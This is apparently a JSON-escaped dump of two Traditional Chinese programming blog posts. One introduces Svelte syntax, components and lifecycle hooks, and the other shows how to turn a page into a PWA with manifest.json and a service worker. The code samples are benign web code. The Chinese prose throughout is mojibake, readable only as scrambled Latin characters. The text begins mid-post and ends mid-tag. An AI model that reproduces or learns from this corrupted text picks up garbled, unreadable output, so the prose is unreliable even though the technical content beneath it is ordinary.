æä¾›ç•°æ­¥æ¸²æŸ“æ¨™ç±¤ï¼Œå¯ä»¥æå‡ç”¨æˆ¶é«”é©—ã€‚\nèªæ³•ï¼š\n1 2 3 4 5 6 7 {#await expression} ... {:then name} ... {:catch name} ... {/await} ä»¥ #await é–‹å§‹ã€ä»¥ /await çµæŸã€‚\n:then ä»£è¡¨æˆåŠŸçµæœï¼Œ:catch ä»£è¡¨å¤±æ•—çµæœã€‚\nexpressionæ˜¯åˆ¤æ–·é«”ï¼Œè¦æ±‚è¿”å›ä¸€å€‹Promiseã€‚\nå…¶å¯¦ç”¨æ³•å’Œ #if ... :else if ... /if æœ‰é‚£éº¼ä¸€ä¸Ÿä¸Ÿåƒã€‚\nèˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; const api = new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve(\u0026#39;è«‹æ±‚æˆåŠŸï¼Œæ•¸æ“šæ˜¯xxxxx\u0026#39;) }, 1000) }) \u0026lt;/script\u0026gt; {#await api} \u0026lt;span\u0026gt;Loading...\u0026lt;/span\u0026gt; {:then response} \u0026lt;span\u0026gt;{response}\u0026lt;/span\u0026gt; {:catch error} \u0026lt;span\u0026gt;{error}\u0026lt;/span\u0026gt; {/await} å¦‚æœå°‡ä¸Šé¢çš„ resolve æ”¹æˆ reject å°±æœƒèµ° :catch åˆ†æ”¯ã€‚\nåŸºç¤çµ„ä»¶ åœ¨ Svelte ä¸­ï¼Œå‰µå»ºçµ„ä»¶åªéœ€è¦å‰µå»ºä¸€å€‹ .svelte ç‚ºå¾Œç¶´çš„æ–‡ä»¶å³å¯ã€‚\né€šé import å¼•å…¥å­çµ„ä»¶ã€‚\næ¯”å¦‚ï¼Œåœ¨ src ç›®éŒ„ä¸‹æœ‰ App.svelte å’Œ Phone.svelte å…©å€‹çµ„ä»¶ã€‚\nApp.svelte æ˜¯çˆ¶ç´šï¼Œæƒ³è¦å¼•å…¥ Phone.svelte ä¸¦åœ¨ HTML ä¸­ä½¿ç”¨ã€‚\nApp.svelte 1 2 3 4 5 6 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;å­çµ„ä»¶ Phone çš„å†…å®¹ï¼š\u0026lt;/div\u0026gt; \u0026lt;Phone /\u0026gt; Phone.svelte 1 \u0026lt;div\u0026gt;é›»è©±ï¼š13266668888\u0026lt;/div\u0026gt; çµ„ä»¶é€šè¨Š çµ„ä»¶é€šè¨Šä¸»è¦æ˜¯ çˆ¶å­çµ„ä»¶ ä¹‹é–“çš„æ•¸æ“šä¾†å¾€ã€‚\nçˆ¶å‚³å­ æ¯”å¦‚ä¸Šé¢çš„ä¾‹å­ï¼Œæ‰‹æ©Ÿè™Ÿå¸Œæœ›å¾ App.svelte çµ„ä»¶å¾€ Phone.svelte è£¡å‚³ã€‚\nå¯ä»¥åœ¨ Phone.svelte ä¸­è²æ˜ä¸€å€‹è®Šé‡ï¼Œä¸¦å…¬é–‹è©²è®Šé‡ã€‚\nApp.svelte å°±å¯ä»¥ä½¿ç”¨å°æ‡‰çš„å±¬æ€§æŠŠå€¼å‚³å…¥ã€‚\nApp.svelte 1 2 3 4 5 6 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;å­çµ„ä»¶ Phone çš„å†…å®¹ï¼š\u0026lt;/div\u0026gt; \u0026lt;Phone number=\u0026#34;88888888\u0026#34; /\u0026gt; Phone.svelte 1 2 3 4 5 \u0026lt;script\u0026gt; export let number = \u0026#39;13266668888\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;é›»è©±ï¼š{number}\u0026lt;/div\u0026gt; å¦‚æœæ­¤æ™‚ App.svelte çµ„ä»¶æ²’æœ‰å‚³å€¼é€²ä¾†ï¼ŒPhone.svelte å°±æœƒä½¿ç”¨é»˜èªå€¼ã€‚\nå­å‚³çˆ¶ å¦‚æœæƒ³åœ¨å­çµ„ä»¶ä¸­ä¿®æ”¹çˆ¶çµ„ä»¶çš„å…§å®¹ï¼Œéœ€è¦æŠŠä¿®æ”¹çš„æ–¹æ³•å®šç¾©åœ¨çˆ¶çµ„ä»¶ä¸­ï¼Œä¸¦æŠŠè©²æ–¹æ³•å‚³çµ¦å­çµ„ä»¶èª¿ç”¨ã€‚\nåŒæ™‚éœ€è¦åœ¨å­çµ„ä»¶ä¸­å¼•å…¥ createEventDispatcher æ–¹æ³•ã€‚\nApp.svelte 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; function print(data) { console.log(`æ‰‹æ©Ÿè™Ÿç¢¼ï¼š${data.detail}`) } \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;å­çµ„ä»¶ Phone çš„å†…å®¹ï¼š\u0026lt;/div\u0026gt; \u0026lt;Phone on:printPhone={print} /\u0026gt; Phone.svelte 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; import { createEventDispatcher } from \u0026#39;svelte\u0026#39; const dispatch = createEventDispatcher() function printPhone() { dispatch(\u0026#39;printPhone\u0026#39;, \u0026#39;13288888888\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click={printPhone}\u0026gt;è¼¸å‡ºæ‰‹æ©Ÿè™Ÿç¢¼\u0026lt;/button\u0026gt; çˆ¶çµ„ä»¶æ¥å—åƒæ•¸æ˜¯ä¸€å€‹å°è±¡ï¼Œå­çµ„ä»¶å‚³éä¾†çš„å€¼éƒ½æœƒæ”¾åœ¨ detail å±¬æ€§è£¡ã€‚\næ’æ§½ slot å’Œ Vue ä¸€æ¨£ï¼ŒSvelte ä¹Ÿæœ‰çµ„ä»¶æ’æ§½ã€‚\nåœ¨å­çµ„ä»¶ä¸­ä½¿ç”¨ \u0026lt;slot\u0026gt; æ¨™ç±¤ï¼Œå¯ä»¥æ¥æ”¶çˆ¶çµ„ä»¶å‚³é€²ä¾†çš„ HTML å…§å®¹ã€‚\nApp.svelte 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;å­çµ„ä»¶ Phone çš„å†…å®¹ï¼š\u0026lt;/div\u0026gt; \u0026lt;Phone\u0026gt; \u0026lt;div\u0026gt;é›»è©±ï¼š\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;13288889999\u0026lt;/div\u0026gt; \u0026lt;/Phone\u0026gt; Phone.svelte 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;style\u0026gt; .box { width: 100px; border: 1px solid #aaa; border-radius: 8px; box-shadow: 2px 2px 8px rgba(0,0,0,0.1); padding: 1em; margin: 1em 0; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;slot\u0026gt;é»˜è®¤å€¼\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; ç”Ÿå‘½é€±æœŸ ç”Ÿå‘½é€±æœŸæ˜¯æŒ‡é …ç›®é‹è¡Œæ™‚ï¼ŒæŒ‡å®šæ™‚æœŸæœƒè‡ªå‹•åŸ·è¡Œçš„æ–¹æ³•ã€‚\nSvelte ä¸­ä¸»è¦æœ‰ä»¥ä¸‹å¹¾å€‹ç”Ÿå‘½é€±æœŸï¼š\nonMountï¼š çµ„ä»¶æ›è¼‰æ™‚èª¿ç”¨ã€‚ onDestroyï¼š çµ„ä»¶éŠ·æ¯€æ™‚åŸ·è¡Œã€‚ beforeUpdateï¼š åœ¨æ•¸æ“šæ›´æ–°å‰åŸ·è¡Œã€‚ afterUpdateï¼š åœ¨æ•¸æ“šæ›´æ–°å®Œæˆå¾ŒåŸ·è¡Œã€‚ tickï¼š DOMå…ƒç´ æ›´æ–°å®Œæˆå¾ŒåŸ·è¡Œã€‚ ä»¥ä¸Šç”Ÿå‘½é€±æœŸéƒ½æ˜¯éœ€è¦å¾ svelte è£¡å¼•å…¥çš„ã€‚\nç”¨ onMount èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; import { onMount } from \u0026#39;svelte\u0026#39; let title = \u0026#39;Hello world\u0026#39; onMount(() =\u0026gt; { console.log(\u0026#39;onMount\u0026#39;) setTimeout(() =\u0026gt; title = \u0026#39;é›·çŒ´\u0026#39;, 1000) }) \u0026lt;/script\u0026gt; \u0026lt;h1\u0026gt;{title}\u0026lt;/h1\u0026gt; åœ¨çµ„ä»¶åŠ è¼‰å®Œ1ç§’å¾Œï¼Œæ”¹è®Š title çš„å€¼ã€‚\nonDestroyã€beforeUpdate å’Œ afterUpdate éƒ½å’Œ onMount çš„ç”¨æ³•å·®ä¸å¤šï¼Œåªæ˜¯åŸ·è¡Œçš„æ™‚é–“æ¢ä»¶ä¸åŒã€‚\ntick æ˜¯æ¯”è¼ƒç‰¹æ®Šçš„ï¼Œtick å’Œ Vue çš„ nextTick å·®ä¸å¤šã€‚\nåœ¨ Svelte ä¸­ï¼Œtick çš„ä½¿ç”¨èªæ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 \u0026lt;script\u0026gt; import { tick } from \u0026#39;svelte\u0026#39; await tick() // å…¶ä»–æ“ä½œ \u0026lt;/script\u0026gt; ç¸½çµ æœ¬æ–‡ä¸»è¦è¬›è§£äº† Svelte çš„åŸºç¤ç”¨æ³•ï¼Œä½† Svelte çš„å…§å®¹å’Œ API é ä¸æ­¢æ­¤ã€‚å®ƒé‚„æœ‰å¾ˆå¤šé«˜ç´šçš„ç”¨æ³•ä»¥åŠæä¾›äº†éæ¸¡å‹•ç•«åŠŸèƒ½ç­‰ã€‚\nSvelte æ˜¯ä¸€å€‹ Web æ‡‰ç”¨çš„æ§‹å»ºå·¥å…·ï¼Œå®ƒæ‰“åŒ…å‡ºä¾†çš„é …ç›®é«”ç©æ¯”è¼ƒå°ï¼Œæ€§èƒ½å¼·ï¼Œä¸ä½¿ç”¨è™›æ“¬DOMã€‚\nä½† Svelte çš„å…¼å®¹æ€§å’Œå‘¨é‚Šç”Ÿæ…‹ç›¸æ¯”èµ· Vue å’Œ React æœƒå·®ä¸€é»ã€‚\næ‰€ä»¥æ—¥å¸¸é …ç›®ä¸­éœ€è¦æ ¹æ“š Svelte çš„å„ªç¼ºé»é€²è¡Œå–æ¨ã€‚\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52441500615_771efe89dd_o.png","permalink":"https://wayneblog.ga/2022-10-21/svelte-quick-start/","title":"å‰ç«¯æ–°å¯µå…’ï¼Ÿ - Svelte ä»‹ç´¹"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå‰å¹¾å¤©èˆ‡å¤§å®¶åˆ†äº«ï¼Œç•¶é–‹å•ŸChromeå…§å»ºçš„PWAåŠŸèƒ½ï¼Œå°±å¯å°‡PWAçš„ç¶²é ï¼Œä¸€éµè®Šæˆä¸€å€‹æ‡‰ç”¨ç¨‹å¼ï¼Œé›–ç„¶èªªPWAåªæ˜¯åœ¨æ‡‰ç”¨ç¨‹å¼è£¡ï¼ŒåŒ…äº†Chromeçš„ç€è¦½å™¨ï¼Œä½†é–‹å•Ÿæ™‚å°±åƒæ‡‰ç”¨ç¨‹å¼ä¸€èˆ¬ï¼Œè®“ç¶²é å°±åƒæ‡‰ç”¨ç¨‹å¼ä¸€èˆ¬ï¼Œå…¶å¯¦ç°¡å–®çš„ä¾†èªªï¼Œé€™å°±æœ‰é»åƒPhoneGapçš„æ„Ÿè¦ºï¼Œä½†æ¯”PhoneGapè¦ä¾†çš„ç°¡å–®è¨±å¤šã€‚\nå› æ­¤åªè¦å°‡ç¶²é åŠ å…¥ä¸€äº›ç°¡å–®çš„å®£å‘Šèˆ‡è¨­å®šï¼Œç«‹å³å°±å¯å°‡ä¸€èˆ¬çš„ç¶²é è®ŠæˆPWAçš„ç¶²é æ‡‰ç”¨ç¨‹å¼ï¼ŒçœŸå¿ƒè¦ºå¾—PWAæ˜¯å€‹å¥½ç‰©ï¼Œå› æ­¤åªè¦ä½ æœƒå¯«ç¶²é ï¼Œå°±å¯å°‡ä½ æ‰€è¨­è¨ˆçš„ç¶²é è®Šæˆä¸€éš»æ‡‰ç”¨ç¨‹å¼ï¼\nå°‡ç¶²é è®ŠæˆProgressive Web Application(PWA) Step1ï¼šä¸‹è¼‰ Chrome æ“´å……å¥—ä»¶ é»æˆ‘å‰å¾€ ã€ŒWeb Serverã€ æ“´å……å¥—ä»¶\né¦–å…ˆï¼Œä½ å¯å…ˆä¸‹è¼‰Chromeçš„ã€ŒWeb Serverã€æ“´å……ç¨‹å¼ï¼Œå†é»ã€ŒCHOSOSE FOLDERã€éˆ•ï¼Œé¸æ“‡å·²è£½ä½œå¥½çš„ç¶²é ç›®éŒ„ã€‚\nStep2ï¼šæª¢æŸ¥ç¶²é  é»ä¸€ä¸‹é€£çµï¼Œä¸¦æª¢æŸ¥ç¶²é æ˜¯å¦èƒ½æ­£å¸¸å‘ˆç¾ã€‚\nStep3ï¼šå»ºç«‹ manifest.json æ›´å¤š manifest.json ä»‹ç´¹ï¼Œé»æˆ‘å‰å¾€\næ¥è‘—å»ºç«‹ä¸€å€‹æ–°çš„æ–‡ä»¶æª”ï¼Œä¸¦ä¾çš„è¼¸å…¥æ‡‰ç”¨ç¨‹å¼åç¨±ã€åœ–ç¤ºã€èˆ‡æ‡‰ç”¨ç¨‹å¼çš„URLï¼Œå†å°‡å®ƒå„²å­˜ç‚ºã€Œmanifest.jsonã€æª”ã€‚\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 { \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;å‰æ©çš„éƒ¨è½æ ¼ï¼Œç”¨æ–¼ç´€éŒ„coding lifeæŸ¥æ‰¾çš„è³‡æ–™ã€ç­†è¨˜èˆ‡æ–‡ç« ï¼Œçµ±æ•´èµ·ä¾†é™¤äº†è‡ªå·±ä½¿ç”¨ï¼Œä¹Ÿå¸Œæœ›å°å„ä½æœ‰å¹«åŠ©ã€‚\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-57x57.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-114x114.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-120x120.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;120x120\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-180x180.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;180x180\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-192x192.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-512x512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#f5f5fa\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34;, \u0026#34;prefer_related_applications\u0026#34;: false } Step4ï¼šhtml åŠ å…¥ manifest.json åœ¨headæ¨™ç±¤ä¸­åŠ å…¥ manifest.jsonã€‚\n1 2 3 \u0026lt;!-- ... --\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;./manifest.json\u0026#34; /\u0026gt; \u0026lt;!-- ... --\u0026gt; ç”±æ–¼ manifest åœ¨ IOS ä¸Šé‚„ä¸æ”¯æ´ï¼Œå› æ­¤å¦‚æœ IOS ä¸Šä¹Ÿæƒ³è¦è‡ªè¨‚ iconï¼Œå°±è¦æ”¹ç”¨ HTML è£¡çš„ meta ä¾†è¨­å®šï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;!-- ... --\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;./manifest.json\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;57x57\u0026#34; href=\u0026#34;./apple-touch-icon-57x57.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;114x114\u0026#34; href=\u0026#34;./apple-touch-icon-114x114.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;120x120\u0026#34; href=\u0026#34;./apple-touch-icon-120x120.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;180x180\u0026#34; href=\u0026#34;./apple-touch-icon-180x180.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;192x192\u0026#34; href=\u0026#34;./apple-touch-icon-192x192.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;512x512\u0026#34; href=\u0026#34;./apple-touch-icon-512x512.png\u0026#34; /\u0026gt; \u0026lt;!-- ... --\u0026gt; Step5ï¼šæ‰“é–‹é–‹ç™¼äººå“¡å·¥å…·æª¢æŸ¥ manifest.json çš„è¨­å®š Step6ï¼šåŠ å…¥ serviceWorker èªæ³• æ›´å¤š Service Worker ä»‹ç´¹ï¼Œé»æˆ‘å‰å¾€\nåœ¨ç¶²é å‰åŠ å…¥ä¸‹æ–¹çš„èªæ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; if (\u0026#34;serviceWorker\u0026#34; in navigator) { console.log(\u0026#34;Will service worker register?\u0026#34;); navigator.serviceWorker.register(\u0026#34;./service-worker.js\u0026#34;).then(function(reg) { console.log(\u0026#34;Yes it did.\u0026#34;); }).catch(function(err) { console.log(\u0026#34;No, it didn\u0026#39;t. This happened: \u0026#34;, err); }); } \u0026lt;/script\u0026gt; Step7ï¼šå»ºç«‹ service-worker.js æª”æ¡ˆ æ¥è‘—å†å»ºç«‹ä¸€å€‹æ–‡ä»¶ï¼Œä¸¦è²¼ä¸Šä¸‹æ–¹çš„èªæ³•ï¼Œå„²å­˜ç‚º service-worker.jsï¼Œé€™æ™‚å¯çœ‹åˆ°åœ¨åŸä¾†çš„ç¶²é ä¸­ï¼Œåˆ†åˆ¥æœƒå¤šäº† manifest.json èˆ‡ service-worker.js å’Œåœ–ç‰‡è³‡æ–™å¤¾ã€‚\nservice-worker.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 self.addEventListener(\u0026#39;install\u0026#39;, function(event) { self.skipWaiting(); var offlinePage = new Request(\u0026#39;offline.html\u0026#39;); event.waitUntil( fetch(offlinePage).then(function(response) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.put(offlinePage, response); }); })); }); self.addEventListener(\u0026#39;fetch\u0026#39;, function(event) { event.respondWith( fetch(event.request).catch(function(error) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.match(\u0026#39;offline.html\u0026#39;); }); })); }); self.addEventListener(\u0026#39;refreshOffline\u0026#39;, function(response) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.put(offlinePage, response); }); }); self.addEventListener(\u0026#39;push\u0026#39;, function (event) { var data = event.data.json(); var opts = { body: data.body, icon: data.icon, data: { url: data.url } }; event.waitUntil(self.registration.showNotification(data.title, opts)); }); self.addEventListener(\u0026#39;notificationclick\u0026#39;, function(event) { var data = event.notification.data; event.notification.close(); event.waitUntil( clients.openWindow(data.url) ); }); Step8ï¼šç¢ºèª Service Workers æ˜¯å¦æ­£å¸¸ æ¥è‘—å†å›åˆ°ç¶²é çš„ã€Œé–‹ç™¼äººå“¡å·¥å…·ã€çš„ Service Workers æ™‚ï¼Œå°±æœƒçœ‹åˆ°ç¶ è‰²ç‡ˆè™Ÿã€‚\nStep9ï¼šå®‰è£ã€Œé é¢ã€ éƒ½å®Œæˆå¾Œï¼Œå†é» Chrome å³ä¸Šçš„é¸å–®åœ–ç¤ºï¼Œå°±å¯çœ‹åˆ°ã€Œå®‰è£XXXã€ã€‚\nStep10ï¼šå®‰è£ é»ä¸€ä¸‹ï¼Œå°±æœƒå‡ºç¾å®‰è£ç•«é¢ï¼Œå†é»ã€Œå®‰è£ã€ã€‚\nç•¶å®‰è£å®Œç•¢å¾Œï¼Œå°±æœƒé–‹å•Ÿå‰›æ‰€å®‰è£çš„æ‡‰ç”¨ç¨‹å¼ï¼Œå“ˆï¼æ˜¯ä¸æ˜¯ç•«é¢ä¹¾æ·¨è¨±å¤šï¼Œå°±åƒåœ¨ä½¿ç”¨ä¸€èˆ¬çš„æ‡‰ç”¨ç¨‹å¼ä¸€æ¨£ï¼Œæœ‰äº†PWAå¾Œå¯å¯¦ç¾é€éç¶²é å°±èƒ½æ‰“é€ å°ˆå±¬çš„æ‡‰ç”¨ç¨‹å¼çš„å¤¢æƒ³ï¼Œä¸”å®Œå…¨ä¸ç”¨å†å­¸æ–°èªè¨€ï¼ŒçœŸæ˜¯è¶…æ–¹ä¾¿çš„ã€‚\nmanifest.json ä»‹ç´¹ ä»¥ä¸‹ä¾†èªªæ˜ä¸€ä¸‹ manifest.json\nmanifest.json æ˜¯åœ¨å­¸ PWA é€™å¡Šæ™‚æœ€ç°¡å–®çš„éƒ¨ä»½ï¼Œä¸»è¦æ˜¯å»ºä¸€æ”¯ JSON æª”å°±å¯ä»¥ï¼Œç›¸é—œçš„åƒæ•¸ MDNä¸Š æˆ–æ˜¯ Google ä¸€ä¸‹å°±æœƒçœ‹åˆ°ï¼Œä¸ç”¨èŠ±å¤ªå¤šçš„æ™‚é–“å»è¨˜ã€‚\nmanifest.jsonæ˜¯åšä»€éº¼ç”¨çš„ï¼Ÿ æ ¹æ“š MDN ä¸Šçš„è§£é‡‹ï¼Œmanifest.json æ˜¯é€™æ¨£å­çš„ï¼š\nå®ƒæä¾›äº†æ‡‰ç”¨ç¨‹å¼ç›¸é—œçš„è³‡è¨Šï¼ˆåƒæ˜¯åç¨±ã€ä½œè€…ã€åœ–ç¤ºã€æè¿°ï¼‰ã€‚ manifest çš„åŠŸç”¨æ˜¯å°‡ Web æ‡‰ç”¨ç¨‹å¼å®‰è£åˆ°è¨­å‚™çš„ä¸»ç•«é¢ï¼Œç‚ºä½¿ç”¨è€…æä¾›æ›´å¿«é€Ÿçš„è¨ªå•å’Œæ›´è±å¯Œçš„é«”é©—ã€‚\nç°¡å–®çš„èªªæ˜å°±æ˜¯ï¼ŒPWA ä¸»è¦å°±æ˜¯è®“ç¶²é å¯ä»¥æ¨¡æ“¬æˆä¸€å€‹æ‰‹æ©Ÿçš„ App ä¾†ä½¿ç”¨ï¼Œè¦ç•¶æˆ Appï¼Œå°±è¦æœ‰ App çš„æ¨£å­ï¼Œå°±è¦èƒ½åœ¨æ‰‹æ©Ÿçš„æ¡Œé¢ä¸Šæœ‰ä¸€å€‹ icon å¯ä»¥æŒ‰ï¼ŒæŒ‰ä¸‹å»å¾Œæœ‰ä¸€å€‹å¹¾ç§’é˜çš„å•Ÿå‹•ç•«é¢è®“ä½¿ç”¨è€…çŸ¥é“é–‹å•Ÿçš„ App æ˜¯ä»€éº¼ï¼Œmanifest å°±æ˜¯åœ¨è™•ç†é€™æ®µã€‚\nå¦å¤–ï¼Œä¸€èˆ¬æˆ‘å€‘åœ¨æ‰‹æ©Ÿä¸Šé–‹ Chrome æˆ– Safari çœ‹ç¶²é æ™‚ï¼Œæœ€é ‚éƒ¨æœƒæœ‰ä¸€æ¢ç¶²å€åˆ—ï¼Œä½†ä¸€èˆ¬ App æ˜¯ä¸æœƒæœ‰çš„ï¼Œè€Œ manifest.json ä¹Ÿå¯ä»¥è¨­å®šé–‹å•Ÿé é¢æ™‚ä¸é¡¯ç¤ºç¶²å€åˆ—ã€‚\nPWA æ˜¯æŠŠé é¢æ¨¡æ“¬æˆ App çš„ä¸€å€‹æ–¹æ³•ï¼Œå¦‚æœå…¬å¸æœ¬èº«ä¹Ÿæœ‰è£½ä½œ App å‘¢ï¼Ÿmanifest.json ä¸Šä¹Ÿå¯ä»¥è¨­å®š App åœ¨ Google Playã€App Store ä¸Šçš„é€£çµï¼Œä¸¦å‘ˆç¾ä¸€å€‹æ¨è–¦é€šçŸ¥è®“ä½¿ç”¨è€…å¯ä»¥é€²å…¥ä¸¦ä¸‹è¼‰ã€‚\næœ€å¾Œè£œå……ä¸€é»ï¼Œä¸è«–æ˜¯ PWA çš„ Cache æˆ–æ˜¯æ¨æ’­åŠŸèƒ½ï¼Œéƒ½è¦æ±‚ç¶²ç«™è¦æ˜¯ httpsï¼Œmanifest.json é€™é»ä¹Ÿä¸æ„å¤–ï¼Œå¦‚æœç¶²ç«™ä¸æ˜¯ httpsï¼Œå³ä¾¿å¼•ç”¨äº† manifest.jsonï¼Œä¹Ÿä¸æœƒè¢« Chrome ä¸»å‹•è©¢å•æ˜¯å¦è¦å°‡ç¶²ç«™åŠ å…¥åˆ°ä¸»ç•«é¢ã€‚\né—œæ–¼ manifest çš„åŠŸèƒ½ï¼ŒGoogle æœ‰ä¸€éš»å½±ç‰‡ä»‹ç´¹ï¼š\nWeb App Manifest: Totally Tooling Tips\nmanifest.json æˆå“¡ æˆå“¡åˆ—è¡¨æ•´ç†å¦‚ä¸‹ï¼š\næ¬„ä½ èªªæ˜ theme_color æ‡‰ç”¨ç¨‹å¼çš„ä¸»è¦é¡è‰² background_color å•Ÿå‹•ç•«é¢ï¼ˆsplash screenï¼‰çš„èƒŒæ™¯è‰² icons æ‡‰ç”¨ç¨‹å¼çš„åœ–ç¤º name æ‡‰ç”¨ç¨‹å¼çš„åç¨± short_name æ‡‰ç”¨ç¨‹å¼çš„ç°¡å¯« lang ä¸»è¦èªè¨€ description æ‡‰ç”¨ç¨‹å¼çš„æè¿° dir æ–‡å­—æ›¸å¯«æ–¹å‘ display æ‡‰ç”¨ç¨‹å¼çš„é¡¯ç¤ºæ¨¡å¼ orientation é è¨­é¡¯ç¤ºçš„æ–¹å‘æ˜¯ç›´çš„æˆ–æ©«çš„ prefer_related_applications æ˜¯å¦è¦æ¨è–¦ä¸€å€‹åŸç”Ÿçš„ App related_applications æ¨è–¦åŸç”Ÿ App çš„é€£çµ start_url é–‹å•Ÿæ‡‰ç”¨ç¨‹å¼æ™‚çš„é è¨­ç¶²å€ scope æ‡‰ç”¨ç¨‹å¼çš„ä½¿ç”¨ç¯„åœ theme_color æ‡‰ç”¨ç¨‹å¼çš„ä¸»è¦é¡è‰²ï¼Œä¸»è¦å¯ä»¥æ”¹è®Šç¶²å€åˆ—é‚£ä¸€æ¢çš„é¡è‰²ã€‚\n1 \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34; background_color å•Ÿå‹•ç•«é¢ï¼ˆsplash screenï¼‰çš„èƒŒæ™¯è‰²ï¼ŒApp å•Ÿå‹•æ™‚ï¼Œæœƒæœ‰ä¸€å€‹ Splash Screenï¼Œç¿»è­¯æˆå¿«é–ƒé ã€éå ´é ï¼Œæœ¬ç¯‡ç¨±ç‚ºå•Ÿå‹•ç•«é¢ã€‚\nSplash Screen éœ€è¦3å€‹æˆå“¡ï¼šbackground_colorã€iconsã€nameã€‚\n1 \u0026#34;background_color\u0026#34;: \u0026#34;red\u0026#34; è£œå……ä¸€é»ï¼ŒSplash Screenï¼Œåœ¨ IOS ä¸Šæ˜¯ä¸æ”¯æ´çš„ï¼Œä½†å¯ä»¥ç›´æ¥è®€å–ä¸€å¼µåœ–æª”ä¾†ç•¶ä½œå•Ÿå‹•é é¢ï¼Œåœ¨ head è£¡åŠ å…¥ä»¥ä¸‹å°±è¡Œï¼š\n1 2 3 4 5 6 7 \u0026lt;link 